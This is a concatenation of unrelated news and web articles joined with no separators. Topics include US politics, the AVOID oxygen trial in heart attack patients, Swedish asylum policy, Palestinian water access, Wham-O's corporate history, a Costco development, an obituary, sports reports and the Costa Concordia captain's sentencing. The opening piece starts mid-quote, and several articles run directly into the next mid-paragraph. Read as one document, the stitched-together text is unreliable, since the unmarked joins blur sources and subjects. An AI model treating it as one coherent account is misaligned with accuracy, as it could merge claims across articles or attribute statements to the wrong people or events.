“I think we're looking for a generation now of younger Republican leaders. Are they going to put the country first? Are we going to get to the bottom of what happened, or are we going to see nonsense tomorrow,” Schmidt specifically cited, Arkansas Senator Tom Cotton and Florida's Marco Rubio — who both recently had dinner with Trump.
Scarborough was dismissive.
“Donald Trump, again, being a schmuck thinking he can buy people's integrity by inviting them over to the White House and wowing them? I'm sorry, that's how he thinks,” he said, “I know that firsthand. He thinks if he invites you to the White House and gives you food that you are going to cut him a break, cut him slack.”
The borscht belting suggests John Podhoretz is rubbing off on him.
Watch above.

We've been waiting for the AVOID study, since we mentioned it a few years ago in another post on the harm of excessive oxygen. AVOID (Air Versus Oxygen in Myocardial Infarction). Now, it's out. As expected, it shows that unnecessary oxygen supplement worsens outcome. The surprise is just how big a difference it makes! In this study, too much oxygen increased recurrent MI fivefold!
Avoiding hyperoxemia isn't new. Normoxemia has been a trend, but lacked hard evidence in form of an RCT, and the reflex-O2-mask in ED has been hard to fight. Right now, the full AVOID article has yet to be released, but the results have just been presented at AHA's congress in Chicago last week. And AHA has posted a video interview with Dr. Stub, one of the investigators of the AVOID trial, on the results, as well as posted his presentation slides here.
Design
Prospective, multicenter trial, encompassing both pre-hospital and in-hospital treatment of the patients. Included STEMI patients with an initial Sat >94% and STEMI symptoms less than 12 hours.
Here's the flow chart for patients in AVOID. Pre-hospital is above the stapled line, in-hospital below.
Study endpoints
The endpoint was infarct size measured by TnT and CK-MB, as well as judging infarct size by MRI scans 6 months post MI. There was a (just) significant increase in cardiac enzymes and borderline significant increase in infarct size by MRI in the oxygen group.
Important clinical endpoints
Of clinical interest was that the oxygen arm had highly significant increase of recurrent MI during admission – the risk was 5x as high! The no-oxygen group had a recurrent MI rate of 0.9%, but it was 5.5% in the oxygen group! Also, they found an increase of significant arrythmias in the oxygen group. These are based on rather small numbers, so the big effect seen here might not be replicated. There were no reported positive effects of oxygen supplement, except for the happy bleep of the monitor measuring 100% sats.
This is a quite small study, but falls nicely into place with other evidence on oxygen toxicity, and how we've moved away from supranormal levels of oxygenation. There's currently a larger RCT underway in Sweden that will measure more hard endpoints, the DETO2X study. Read about it on deto2x.se. It'll be interesting to see those results too. Also, go read the old evidence on oxygen toxicity stretching back to the 50s in this post: Oxygen. Enough, already.
We'll be back with a more detailed report when the full AVOID article is out. But for now, turn off that oxygen for patients with sats >94% on room air! It's been an infatuation for way too long, it's time to break up with MONA.
AVOID trial abstract Background
Oxygen is commonly administered to patients with ST-elevation myocardial infarction (STEMI) despite previous studies suggesting a possible increase in myocardial injury due to coronary vasoconstriction and heightened oxidative stress.
Methods
We conducted a multicenter, prospective, randomized, controlled trial comparing oxygen (8 L/min) with no supplemental oxygen in patients with STEMI diagnosed on paramedic 12-lead electrocardiogram. Of 638 patients randomized, 441 were confirmed STEMI patients who underwent primary endpoint analysis. The primary endpoint was myocardial infarct size as assessed by cardiac enzymes, troponin (cTnI) and creatine kinase (CK). Secondary endpoints included recurrent myocardial infarction, cardiac arrhythmia and myocardial infarct size assessed by cardiac magnetic resonance (CMR) imaging at 6 months.
Results
There was a significant increase in mean peak CK in the oxygen group compared to the no oxygen group (1948 U/Lvs.1543 U/L; means ratio, 1.27; 95% CI, 1.04 to 1.52; P= 0.01). Mean peak troponin was similar in the oxygen and no oxygen groups (57.4 mcg/L vs. 48.0 mcg/L; ratio, 1.20; 95% confidence interval [CI], 0.92 to 1.56;P=0.18).There was an increase in the rate of recurrent myocardial infarction in the oxygen group compared to the no oxygen group (5.5%vs.0.9%, P=0.006) and an increase in frequency of cardiac arrhythmia (40.4%vs.31.4%; P=0.05). At 6-months the oxygen group had an increase in myocardial infarct size on CMR n=139;20.3grams vs. 13.1grams; P=0.04).
Conclusion
Supplemental oxygen therapy in patients with STEMI but without hypoxia increased early myocardial injury and was associated with larger myocardial infarct size assessed at six months.

Former FBI Director James Comey Chip Somodevilla/Getty images Paul Krugman on Wednesday said Republicans supporting President Donald Trump's firing of FBI Director James Comey are complicit in the undermining of the US democracy.
The Nobel laureate economist and New York Times columnist took to Twitter to express his belief that the Trump administration is no longer "legitimate" and to criticize any Republican defending Comey's firing.
"At this point we arguably do not have a legitimate president or administration," Krugman tweeted in response to a story about Democrats boycotting Senate committee meetings due to the firing. "We don't know the whole truth here. But the point is that Trump is trying to prevent us from finding out."
The White House said Trump had mulled firing Comey for some time due to what they painted as repeated missteps on the part of the director. Krugman didn't buy the White House's explanation, instead suggesting that Trump was trying to sabotage the FBI investigation into possible ties between the Trump campaign and Russian officials.
"This is a clear violation of the spirit of his oath of office, and probably the letter; he is setting himself above the law," Krugman said. "He deserves no presumption of innocence, and no deference to claims that he has the right to govern."
Krugman has been constantly critical of Trump's ties to Russia since his election, saying they undermine the legitimacy of his office. He also has said that he believes Comey's letter to Congress regrading the investigation into Hillary Clinton's private email server cost the Democratic nominee the election.
The economist also took issue with Republicans defending Trump. While a number of prominent GOP lawmakers such as Sen. Lindsey Graham and John McCain have taken issue with the move, there have been others that have said it was the right thing to do.
"And again, let's be clear: anyone helping with this obvious cover-up is deliberately being complicit with possible foreign subversion," Krugman tweeted. "Remember this any time any Republican, ever, pretends to be more patriotic than Democrats."
The Senate and FBI investigations into the Trump campaign's alleged Russian ties are expected to continue.

‘We simply can't do any more,' prime minister says in announcing Sweden's asylum regime will revert to EU minimum
David Crouch in Gothenburg Tuesday 24 November 2015 13.17 EST
Sweden needs “respite” from the tens of thousands of refugees knocking at its door, the government has said, announcing tough measures to deter asylum seekers in a sharp reversal of its open-door policy towards people fleeing war and persecution.
The country's generous asylum regime would revert to the “EU minimum”, Sweden's prime minister, Stefan Löfven, said on Tuesday, revealing that most refugees would receive only temporary residence permits from April.
Identity checks would be imposed on all modes of transport, and the right to bring families to Sweden would be severely restricted, he said. …
“It pains me that Sweden is no longer capable of receiving asylum seekers at the high level we do today. We simply cannot do any more.”
The reversal in refugee policy, which follows the imposition of border controls two weeks ago, marks a policy choice the ruling red-green coalition would have considered unthinkable until asylum seekers began arriving this autumn at a rate of 10,000 a week. …
California is in the midst of one of the worst droughts in the state's history, prompting Governor Jerry Brown to declare a water "state of emergency."
Ordinary Californians are bearing the brunt of this disaster. While the governor has imposed restrictions to reduce residential water consumption, businesses in the fields of agriculture and hydraulic fracturing have been largely exempt.
Brown's unwillingness to take on these gargantuan corporate water-wasters lends a sharp political element to an otherwise natural disaster.
There's another region in the world, however, where access to water isn't just decided on the whims of politicians dealing with natural disasters. In fact, the very existence of water crises is official state policy for one country: Israel.
Dying of thirst
Despite its location in a region thought to be perennially dry, the Holy Land actually has ample natural freshwater resources - namely in the form of underwater aquifers and the Jordan River. Palestinians in the West Bank and Israeli settlers live in roughly equal proximity to these resources, which theoretically would allow for equal consumption.
Israeli water policy, however, has made this prospect virtually impossible. In fact, there's a shocking disparity.
A report from the United Nations found that the average Israeli settler consumes 300 liters of water per day - a figure surpassing even the average Californian's 290. But thanks to Israeli military action and legal restrictions on access, the average Palestinian in the occupied West Bank only gets about 70.
And for the tens of thousands of Palestinians who live off the water grid altogether, daily consumption hovers at around 30. That's just 10% of the Israeli figure.
Both figures are well below the minimum 100 liters per day recommended by the World Health Organization. While Israelis are watering their lawns and swimming in Olympic-sized pools, Palestinian communities a few kilometers away are literally dying of thirst.
Weaponizing water
This inequality has deep roots - and it's no accident.
Almost immediately after the creation of Israel in 1948, the fledgling country took comprehensive action to secure control of the region's water. These policies were ramped up again following the 1967 Arab-Israeli war, when Israel first assumed control of the Palestinian territories.
That year, the Israeli armed forces issued Military Order 92 - an initiative that put Palestinian water resources under Israel's military jurisdiction. This was shortly followed by Military Order 158, which required Palestinians to obtain permits from the military in order to build new water infrastructure.
If they built new wells, springs, or even rain-collecting containers without Israeli permission, soldiers would confiscate or destroy them, often without prior notification.
These orders, among others, remain on the books to this day. They form the basis for the administration of water access for nearly 4.4 million Palestinians. Although control of water resources is now officially the domain of Mekorot, Israel's national water company, Israeli forces routinely perform operations with the explicit intent of destroying Palestinian water infrastructure.
A veneer of legality
Decades of peace negotiations have done little to grant Palestinians sovereign control over their resources.
Even after the Oslo Accords of the early 1990s, which were supposed to grant the Palestinians some semblance of political agency in the territories, water access remains limited. In fact, the accords simply codified the unfair distribution of water in the region, imbuing these flagrantly harmful practices with a veneer of legality.
Even in Palestinian-administered portions of the West Bank, Israeli troops regularly demolish rain cisterns, pipelines, and agricultural water structures. The Palestinian human rights group Al-Haq has meticulously documented a number of these instances, compiling them in a report examining the extent of the hardship these operations cause to West Bank residents.
One case study detailed the destruction of a farmer's well in a village east of Jenin. His well, along with five others in the area, was destroyed by the military under the pretext that it had been built without proper authorization by Israel - despite the fact that an Israeli permit is supposedly not needed in the Palestinian-administered Area B of the West Bank, where these villages are located.
These operations showcase the coordination between civil and military channels to restrict Palestinian access to water, a system that's been startlingly effective in its goal.
Even when Palestinians attempt to go through the 'proper' Israeli channels, they're met with innumerable obstacles. Two regulatory organizations - the Joint Water Commission (JWC) and the Israeli Civil Administration - have created a bureaucratic nightmare for West Bank residents attempting to acquire permits to either build new instillations or repair the region's floundering infrastructure.
Both organizations are capable of vetoing petitions without explanation, creating a system that prevents Palestinians from maintaining consistent and comprehensive water access.
Meanwhile, access is severely curtailed even where Palestinians have permission to pump water. The most striking inequality lies in the division of the Mountain Aquifer, the only underground aquifer that Palestinians in the West Bank are allowed to access. Despite being the sole source for the territory, Palestinian extraction is limited to 20% of the aquifer's total capacity.
Israel, on the other hand, has access to 80% of the aquifer's water - a stunningly unequal distribution, considering it also has unfettered access to the region's remaining aquifers and the Jordan River.
A worsening crisis
California's drought has captivated US audiences, sparking concern and calls to action to prevent ecological disaster in the face of natural causes. On the subject of Israel's deliberate drought, however, media attention has been virtually nonexistent.
This crisis has become the norm for Palestinians for decades now, though its severity continues to increase as water becomes more scarce. The UN estimates that due to Israel's siege, the Gaza Strip will be uninhabitable by the year 2020. Though the West Bank is relatively well-off in comparison, the water crisis there has resulted in severe economic hardship for hundreds of thousands of Palestinians, a situation that's not conducive to long-term stability in the region.
This water disparity is emblematic of the power disparity between Israel and Palestine - a gulf that seems wholly unrecognized during regional peace talks. In order to have a diplomatic solution to the Israeli-Palestinian question, both parties must enter negotiations on an equal playing field.
This is only possible once Israel's occupation in the West Bank is dismantled, and Palestinians are given access to the water resources they need in order to live their lives with dignity.

Rex Tillerson's visit comes at a sensitive time for US-Russia relations (AFP Photo/EMMANUEL DUNAND)
White House officials have complained they can't get through to Secretary of State Rex Tillerson, whose chief of staff has closed off access to her boss.
The former Exxon Mobil chief executive has frustrated White House officials by surrounding himself with a tight circle of aides, led by his chief of staff, reported the Washington Post.
State Department chief of staff Margaret Peterlin has built a barrier around Tillerson, some Trump aides told the newspaper, and put herself — “and only her,” one administration official sniffed — at the center of information and decision making in the diplomatic agency.
Peterlin has been limiting access to Tillerson, one outside adviser told the newspaper, which has forced White House chief of staff Reince Priebus and other top officials to “sneak around” or call the secretary of state on his cell phone.
“It is stove-piped,” one senior administration official said. “Calls aren't getting returned. It's that kind of crap.”
Some Trump administration officials believe Peterlin has taken too much of a role in hiring state department personnel, although State Department aides dismissed the complaints as sour grapes over political appointees.
Tillerson likes to interview two candidates for most department jobs, the newspaper reported, and he won't hire an inexperienced candidate simply because they worked as a Trump campaign operative.
“A desire for political patronage does not help a candidate overcome a lack of competence,” said senior State Department aide R.C. Hammond.
The White House has picked candidates for about a dozen ambassadorships, but the State Department hasn't acted on the recommendations or even commented on them.
“Not a word back from State,” one adviser said.
Peterlin declined to comment, but Hammond said she's simply doing her job — which is acting on Tillerson's orders.
“She is the chief of staff,” Hammond said. “Her job is to implement what the secretary wants her to do. She leads the staff to be the implementers of what the secretary wants to get done. Margaret doesn't freelance.”
American toy company
Wham-O Headquarters in Carson, California
Wham-O Inc. is an American toy company based in Carson, California, United States. It is known for creating and marketing many popular toys for nearly 70 years, including the Hula Hoop, Frisbee, Slip 'N Slide, Super Ball, Trac-Ball, Silly String, Hacky Sack and Boogie Board.[1]
Corporate history [ edit ]
Richard Knerr (1925–2008[2]) and Arthur "Spud" Melin (1924–2002[3]), two University of Southern California graduates who had been friends since their teens, were unhappy with their jobs and decided to start their own business. In 1948, they formed the WHAM-O Manufacturing Company in the Knerr family garage in South Pasadena. Their first product was the Wham-O Slingshot, made of ash wood, which Knerr and Melin promoted by holding demonstrations of their own slingshot skills. The name "Wham-O" was inspired by the sound of the slingshot's shot hitting the target.[4] The powerful slingshot was adopted by clubs for competitive target shooting and small game hunting.[5] When they outgrew the garage, Knerr and Melin rented a building on S. Marengo Ave in Alhambra, California; and then, in 1955, moved their manufacturing plant to neighboring San Gabriel, California.
Products and marketing [ edit ]
A Frisbee made by Wham-O
In 1957, Wham-O, still a fledgling company, took the idea of Australian bamboo "exercise hoops", manufactured them in Marlex, and called their new product the Hula Hoop. (The name had been used since the 18th century, but till then had not been registered as a trademark.) The Hula-Hoop became the biggest toy fad in modern history.[6][7] Twenty-five million were sold in four months, and in two years sales reached more than 100 million.[8] "Hula Hoop mania" continued through the end of 1959, and netted Wham-O US$45 million (US$346M adjusted for inflation to 2012).
Shortly thereafter, the company had another huge success with the Frisbee. In 1955, inventor Fred Morrison began marketing a plastic flying disc called the Pluto Platter. He sold the design to Wham-O in 1957. In 1959, Wham-O marketed a slightly modified version of the toy, which they renamed the Frisbee—and once again a Wham-O toy became a common part of 1950s life.
In the early 1960s, Wham-O created the Super Ball, a high-bouncing ball made of a hard elastomer Polybutadiene alloy, dubbed Zectron, with a 0.92 coefficient of restitution when bounced on hard surfaces. Around 20 million Super Balls were sold that decade, and the NFL named the Super Bowl games after it.[9]
The Frisbee and Hula Hoop created fads. With other products, Wham-O tried to capitalize on existing national trends. In the 1960s, they produced a US$119 do-it-yourself bomb shelter cover. In 1962, they sold a limbo dance kit to take advantage of that fad; and in 1975, when the movie Jaws was released, they sold plastic shark teeth.
Many products were not successful. During an African safari in the early 1960s, Melin discovered a species of fish that laid eggs in the mud during Africa's dry season. When the rains came, the eggs hatched and fish emerged overnight. This inspired Melin to create the Instant Fish product, an aquarium kit consisting of some of the fish eggs, and some mud in which to hatch them. Its debut at a New York toy fair made it wildly popular, but the eggs could not be produced fast enough, and the product was dropped.
Other products [ edit ]

Strategy [ edit ]
Wham-O's initial success was a result of its founders's insight. Knerr and Melin marketed their products directly to kids, including demonstrating their toys at playgrounds. They extensively researched new product ideas, including traveling around the world.[24]
For many years, the company's strategy was to maintain eight to twelve simple, inexpensive products such as Frisbees, Super Balls, and Hula Hoops. New products were developed for tryout periods. Old ones were retired, for a few years or permanently, as their popularity waned. Since the toys were simple and inexpensive, they could be sold by a wide range of retailers, from large Department Stores to five and dime stores.
As Wham-O changed ownership, its new management adjusted this formula to accommodate the changing toy industry, which had increasingly complex toys and fewer distribution channels.
By 2006, Wham-O's product line included several groups of related items using licensed brand names. For example, Sea-Doo is a brand of personal water craft owned by Bombardier; Wham-O makes a Sea-Doo line of small inflatable rafts designed to be towed behind watercraft.
The company's lines are also more complex, and grouped in related categories—for example, the Sea-Doo line (about a dozen products), several Slip 'N Slide variations, and a group of "lawn games".
On January 31, 2011, Wham-O announced an agreement with ICM, the agency representing Atari video games, to represent Wham-O in movies, television, music, and online content based around its toys.[25]
As of 2017, Wham-O is focused on creating recreational products that are fun to use and motivate people to be more active outdoors. Their marketing strategy, primarily via social media, seeks to motivate people to play outside and share their experiences with others online.

A rendering of what Costco would look like at 5800 Park Lake Road in East Lansing (Photo: Courtesy rendering)
EAST LANSING – A Costco retail warehouse is on track to open in East Lansing sometime next fall.
The East Lansing Planning Commission approved site plans on Wednesday for the $30 million, 157,000 square-foot facility to be built at 5800 Park Lake Road between Saginaw Street and Haslett Road.
“Costco is known as having the highest starting salary in the retail industry,” said Tim Dempsey, the city's planning, building and development director. “Having a retailer with good paying jobs is a benefit to the surrounding community.”
The members-only warehouse would include a tire center and free-standing gas station with 24 spots to fuel up along with a parking lot that could accommodate 750 vehicles. It would employ up to 150 people, Dempsey said.
Four Winds Golf Course closed in 2001. It has been the intended site of two failed redevelopment projects since then.
In 2003, the 64-acre property was approved for a multifamily apartment complex that would include 400 units between 18, three-story buildings. In 2006, eight, five-story buildings were proposed on the site to accommodate 170 apartments.
"For the last 15 years, that property has sat undeveloped," Dempsey said.
Costco is being developed by Theodore Johnson of Oak Brook, Illinois-based TJ Design Strategies.
Dempsey said the site plan will go before East Lansing City Council on Dec. 6 for final approval. TJ Design Strategies is asking for $1.8 million in brownfield reimbursement, where it would recapture 75% of its property taxes for 15 years, Dempsey said. The reimbursement is for grading the land and road improvements on Park Lake Road, he said.
The developer still needs permits from the Michigan Department of Environmental Quality, Michigan Department of Transportation, Ingham County Road Commission and Ingham County Drain Commissioner before construction can begin.
Construction is expected to begin in the first quarter of 2017.

It was February 2004, and Conan O'Brien was hosting his show in Toronto for the week. In the audience at the Elgin Theatre, a man was shouting; the camera panned to him. The man was wearing a jacket that lit up: It read “FLYERMAN.” Known to Torontonians by this sobriquet was Mark Vincent Vistorino, who spent most of his life chasing the limelight.
Mark's OCD is exacerbated by the presence of the film crew. A montage spanning 5 years of Mark's unique door locking ritual. The mashup ends with the full uncut footage of the scene that appears in the movie.
Vistorino had become somewhat of a fixture on the Toronto concert scene as he, sometimes aggressively, handed out flyers promoting his photography business. At other times, he entertained people with his sharp remarks and occasional off-colour jokes. So intense and unique was his persona that two Toronto filmmakers, Jason Tan and Jeff Stephenson made a documentary about Vistorino, which premiered at the 2003 Toronto International Film Festival. Vistorino died on Nov. 15, 2016, on his way to Prague. He was 57.
Article Continued Below
The funeral will be held Tuesday at Morley Bedford Funeral Home at 159 Eglinton Ave. W. Vistorino was born on Nov. 20, 1958. Before he took up fashion photography and became Flyerman, Vistorino worked in his family's meat business, according to a death notice published in the Star. Tan recalled his friendship with Vistorino, which continued long after the documentary's completion. He described Vistorino as someone who could steal the limelight for a brief moment among the big events that were going on. Case in point: the Conan O'Brien incident. Like quite a few other Torontonians, Tan recalled seeing Vistorino hand out flyers which promoted his photography business. He was offering to take headshots of people interesting in working as movie extras. Tan said the flyers said something like this:
Mark Vincent Vistorino, also known as 'Flyerman,' was a presence on the Toronto concert scene. ( photo courtesy Jason Tan )
“DO YOU NEED EXTRA CASH?? “Why not become a movie extra and work in TORONTO's bustling movie industry.”

Vistorino charged them $150 for a photo, and to give them 8 x 10s, and connect them with a casting agency for extras, Tan said. “I don't think you know the power of Flyerman,” Vistorino tells the camera in the documentary, also named Flyerman. “I believe that I am a superhero. People say I'm just a photographer. I'm not just anything.” This was in the late 1980s and 1990s. He stopped handing out flyers in 1997. “It all stopped when his father died and he became focused on managing the affairs of his father's estate,” Tan said, adding he suspects Vistorino's death was a heart attack. A number of people got work through the flyers Vistorino had handed out, Tan added. “Also, towards the end of the flyering and movie extra stuff, from 1998 onward, he became obsessed with elevating his persona of Flyerman to reach some degree of stardom,” he added. “So he made coats/costumes that lit up with the words Flyerman on the back.” He never married and had no children, Tan said, adding that around 2006, Vistorino gave up on the dream of achieving greater stardom and became content to go to rock concerts and events where he'd talk up the event and simply feed off the excitement. Vistorino showed that, if you speak from the heart and say what's on your mind, and are honest in the way you express yourself, then you can pretty much say anything and it will be received by the people, Tan said. “He was always ready to throw his dignity under the bus to make people laugh,” he said. “And he would do that every single day. And say things off the top of his head that were just hilarious. And, even if they were off-colour, they would resonate and they would be honest and I haven't experienced anyone like that in my life, so I think many people will share that experience.” Vistorino who spent a large part of his life trying to find fame, also struggled with OCD, Tan said. Tan spoke to Vistorino about five days before he left on the trip, Nov. 15, 2016. He didn't make it to Prague and died on the flight. “You can't sum him up in one word,” Tan said. “He was just so unusual.”
Governor Butch Otter and state Attorney General Lawrence Wasden are threatening to sue the Trump Administration if it doesn't abolish a holdover policy from former President Obama.
This week, the Idaho leaders joined nine other attorneys general from Republican-led states who want to curtail the Deferred Action for Childhood Arrivals program, also known as DACA. The program protects some undocumented people from deportation who were brought to the country when they were small children.
Click 'play' to hear the audio version of this story.
Otter and Wasden signed a letter to U.S. Attorney General Jeff Sessions saying they'll take legal action if DACA isn't ended by September 5.
According to the Times News, the Trump Administration plans to undo a proposed expansion of DACA currently making its way through the courts. The expansion would've shielded the undocumented children's parents from deportation. While taking issue with broadening the scope of the program, the administration planned to leave DACA in its current state in place.
Leaders of the mostly-Southern states signing the letter to Sessions claim they'll amend a lawsuit focusing on the DACA expansion to target the entire program if it's not revoked by the September deadline.
In Idaho, just over 3,100 people have been authorized to stay in the country by way of the DACA program.

An English man has died after a vibrator became lodged in his rectum and he was too embarrassed to seek immediate medical treatment, an inquest has heard.
Nigel Willis was finally admitted to a London hospital on December 30 last year, five days after he inserted the sex toy in his anus, Southwark Coroners' Court heard.
The 50-year-old diabetic had spent five days on the couch of his mother's home unable to walk or move before he sought help at the urging of a friend.
When the single and unemployed man arrived at Lewisham Hospital he was in septic shock. Doctors soon discovered the "foreign body" in his anus and he underwent emergency surgery.
The vibrator was so deep inside his rectum it had perforated his bowel.
While in hospital Mr Willis' condition worsened and he died on February 7 of multiple organ failure, sepsis and a perforated bowel.
Assistant Coroner to inner-south London Sarah Ormand-Walshe called the case "sad".
"The main cause of death clearly is just the abdomen injury - the injury to the bowel," she said.
The coroner ruled that Mr Willis died as a result of an accident.

Jamie Carragher has told Loris Karius to 'shut up and do his job' after the Liverpool goalkeeper conceded twice in the first half of Sunday's Premier League meeting with West Ham United.
Karius came under-fire for the second week running after failing to keep out a Dimitri Payet free-kick, despite getting a hand to the ball.
The 23-year-old goalkeeper later conceded to Michail Antonio, who established a 2-1 lead for the visitors shortly before half-time.

Karius was criticised last weekend by Carragher and his fellow Sky Sports pundit Gary Neville following his display in a 4-3 defeat to Bournemouth.
The £4.3m summer signing from Mainz later responded to both players and, while claiming to accept the former Liverpool defender's criticism, he did not care much for Neville's comments.
“He was a top player, then he was a manager for a short bit and now he is back to being an expert again,” Karius told the Daily Mail.

While analysing Karius' first-half display on Sky Sports, Carragher addressed the 'keeper's latest comments and criticised him for both goals.
"The 'keeper got criticism last week and he's come out this week and had a pop at Gary Neville, he's mentioned me.
“My advice to him would be just shut up and do your job," he added.
Karius' starting role has come under question since the defeat at the Vitality Stadium, in which his error lead to Nathan Ake's stoppage time winner.
The Germany Under-21 international replaced Simon Mignolet as Liverpool's first-choice 'keeper earlier this season.

WTA Finals Doubles: Peng Shuai and Su-Wei Hsieh Reunite to Defend Title
After splitting up at the end of the U.S. Open, two-time Grand Slam champions Peng Shuai and Su-Wei Hsieh have reunited to defend their title at the doubles competition of the WTA Finals in Singapore.
Shuai of mainland China and Hsieh of Chinese Taipei won their first WTA title together in 2009 at the Italian Open in Rome and followed it up in the same year at the China Open but has separated ways before teaming back again last year.

Since teaming up again, they have regained the Italian crown over defending champions Sara Errani and Roberta Vinci.
Shuai and Hsieh went on to win their first Grand Slam title at the Wimbledon Championships and followed it up with a title in Cincinnati.
At the year-ending WTA Finals in Istanbul, they went on to claim the crown as they defeated Russians Ekaterina Makarova and Elina Vesnina in straight sets.
They started 2014 with a series of wins in Pattaya, Doha and Indian Wells and moved on to be the World's No. 1 tandem before claiming their second Grand Slam title at the French Open against Errani and Vinci.
The Chinese and Chinese Taipei duo somehow lost their juice together after the England Club as they failed to make it into the finals of any WTA tournament after and finally decided to separate their ways after their third round exit in Flushing Meadows.
Since then Shuai found a new partner in the Czech Republic's Andrea Hlavackova who won their first title together in the recent China Open in Beijing.
Hsieh on the other hand has not competed in any doubles tournament since New York but has confirmed of a partnership with Indian star Sania Mirza who is also participating in her last tournament along with teammate Cara Black of Zimbabwe.
Shuai and Hsieh haven't played together since August and are out favored by the Italian duo as well as the Russian tandem.
We'll all find out as the pair will face the Spanish team of Garbine Muguruza and Carla Suarez Navarro in their first round-robin match on Wednesday.

Francesco Schettino turns himself in after Italian court upholds 16-year sentence for his role in cruise liner tragedy
The captain of the doomed Costa Concordia cruise liner has turned himself in after Italy's highest court upheld his 16-year prison sentence for his role in the 2012 tragedy that killed 32 people.
Francesco Schettino, described as “Captain Coward” by the press for abandoning the stricken ship, passed through the gates of the Rebibbia jail in Rome as soon as the judges made their ruling.
Inside Costa Concordia – in pictures Read more
Schettino, 56, was convicted in 2015 of multiple counts of manslaughter, causing a maritime accident and abandoning ship before all passengers and crew had been evacuated. The ship was carrying 4,229 people, including 3,200 tourists.
“He said: ‘I trust in the justice system. The verdict must be respected. I'm handing myself in right now,'” his lawyer Saverio Senese said after speaking to Schettino by telephone.
Alessandra Guarini, a lawyer for relatives of the victims, said: “Justice has finally been served. I hope this brings a bit of serenity to those who lost their loved ones.”
The victims included a five-year old girl and her father, a musician who gave up his seat in a lifeboat for someone else, and a woman who died on impact when she plunged from the sinking liner into the freezing waters.
Elio Vincenzi, the husband of a woman who drowned, said: “Schettino really deserved this sentence, for his lies and for the lack of respect he had, even afterwards, towards the victims of that terrible shipwreck.”

Prosecutors argued that Schettino's recklessness was to blame for the fate of the ship, which struck rocks off the Tuscan island of Giglio on the night of 13 January 2012 and capsized.
Schettino was widely ridiculed during the trial for insisting he had not abandoned ship but had slipped off the Costa Concordia as it rolled over, falling on to a lifeboat which carried him ashore against his wishes.
Francesco Schettino: the captain who refused to return to ship Read more
In a widely quoted phone call, a coastguard official is heard upbraiding Schettino and ordering him to “get back on board, for fuck's sake” – an order the captain refused to follow.
The violation of the ancient code of the sea which states a captain must be the last person off a sinking ship only accounted for one year of the sentence handed down by a three-judge panel in the Tuscan town of Grosseto.
During the first 19-month trial, Schettino was accused of showing off when he steered the ship too close to the island while entertaining a female friend.
Schettino's lawyers insisted the accident and its deadly consequences were primarily due to organisational failings for which the ship's owner, Costa Crociere, its Indonesian helmsman and the Italian coastguard should have shared the blame.
“Schettino is the only one to have paid a price. He was made the scapegoat,” Senese said, adding that the defence team would consider an appeal to the European court of human rights. “Schettino admits he is responsible but not that he is guilty, because on the Concordia there was a command team, he was not alone and the ship had many problems.”
The defence argued that the collision was not the direct cause of the deaths, but rather the chaos that ensued due to the ship losing power, and that Schettino could not be blamed for the mechanical failures.
Costa Crociere avoided potential criminal charges by accepting partial responsibility and agreeing to pay a €1m (£850,000) fine. Five of its employees received non-custodial sentences after making plea bargains early in the investigation.
Chris Long (91) and the St. Louis Rams have a formidable defense. (Photo11: Kirby Lee-USA TODAY Sports)
The St. Louis Rams look a lot like the 2007 and 2011 New York Giants in one crucial respect.
Like those Giants teams, the Rams are built around their defensive line to a degree unmatched by anyone else in the league.
All four Rams starters – ends Robert Quinn and Chris Long, and tackles Aaron Donald and Michael Brockers – were first-round draft picks. And then coach Jeff Fisher augmented that talented group in the offseason by signing free-agent defensive tackle Nick Fairley, a talented if sometimes underachieving former first-round pick of the Detroit Lions.
That closely parallels the defensive line the Giants built going back to the mid-2000s that was the primary reason they won the Super Bowl in the '07 and '11 seasons. Those linemen too were mainly high draft picks (Michael Strahan, William Joseph, Osi Umenyiora, Justin Tuck, Mathias Kiwanuka, Jason Pierre-Paul, Linval Joseph and Marvin Austin) and expensive free agents (Chris Canty).
Now, this isn't a prediction that the 2015 Rams will win the Super Bowl. But the similarities suggest that the Rams are dangerous team for the long haul of the season, even if they're off to only a so-so start at 2-2, heading into Sunday's game against the Green Bay Packers.
"Their defense, (defensive coordinator) Gregg Williams, it took him a year to learn those guys," said a scout from an NFC team. "He had to learn the players, the players had to learn his system. Now they get it. They're going to be good."
The idea of winning a title on the back of a dominating defensive line is an old one in the NFL.
The Detroit Lions, for instance, played in the NFL championship game four times from 1952 through '57 with teams built around a dominating defensive line (Les Bingamen, Thurman McGraw and Ray Krouse were first-team All-Pro multiple times; and Darris McCord went to a Pro Bowl).
The dominating defensive lines since then are better known, probably because of NFL Films. That includes the Los Angeles Rams' "Fearsome Foursome" (Rosey Grier join Lamar Lundy, Merlin Olsen and Deacon Jones), which turned that franchise into a championship contender in the late 1960s.
In the late 1960s and early '70s there was the Minnesota Vikings' "Purple People Eaters" (Jim Marshall, Carl Eller, Alan Page and Gary Larsen), who led that franchise to four Super Bowl appearances in the '70s (Larsen was on only the first three).
And in the mid-to-late '70s there was the "Steel Curtain" ("Mean Joe" Greene, L.C. Greenwood, Ernie Holmes and Dwight White), which was the core of the Pittsburgh Steelers' dynasty that won four Super Bowl titles.
What's different about building a title contender around the defensive line in today's free-agency era is the commitment in resources it takes. Because of free agency, it's almost impossible to keep a defensive line together for more than a couple years, so that means a team that committed to the defensive line has to constantly re-stock with high draft picks and the occasional free agent of its own.
The Giants used six picks in the first three rounds of the drafts from 2006-11 to keep the talent level high on his defensive line.
And Fisher and the head of his personnel department, GM Les Snead, have gone all-in on their defensive line. In three of their last five drafts they've used a first-round pick on that position group three times (Quinn in '11, Brockers in '12 and Donald in '14). Then last offseason they signed Fairley to a one-year, $4 million deal to be part of their defensive tackle rotation. Detroit had drafted Fairley at No. 13 overall in '11.
Fisher's thinking, like the Giants, no doubt is that a dominant defensive lines can cover up weakness behind them better than vice versa.
It worked for the Giants in '07 and '11. Neither of those teams dominated in the regular season – the '07 Giants were a 10-6 wild card, and the '11 Giants won the NFC East Division with a 9-7 record. But their defensive lines made them capable of slowing down premier offenses, because they could pressure quarterbacks with four-man rushes, and thus devote seven men to coverage.
So in '07 seasons they held a New England Patriots' offense that scored the second-most points in league history to only 14 points in the Super Bowl. And in '11, they held down a Packers offense that ranks third in points scored in league history in a 37-20 win.
The Rams, likewise, are looking for their defensive line to carry them to their first playoff appearance since 2004, and perhaps beyond.
While all four starters are good, the two standouts are Donald and Quinn.
Donald, in fact, is quickly becoming regarded as the best defensive tackle in the game. Though he's on the small side for his position (6-feet-1, 285 pounds), he's an incredibly explosive athlete who ran the 40 in 4.68 seconds.
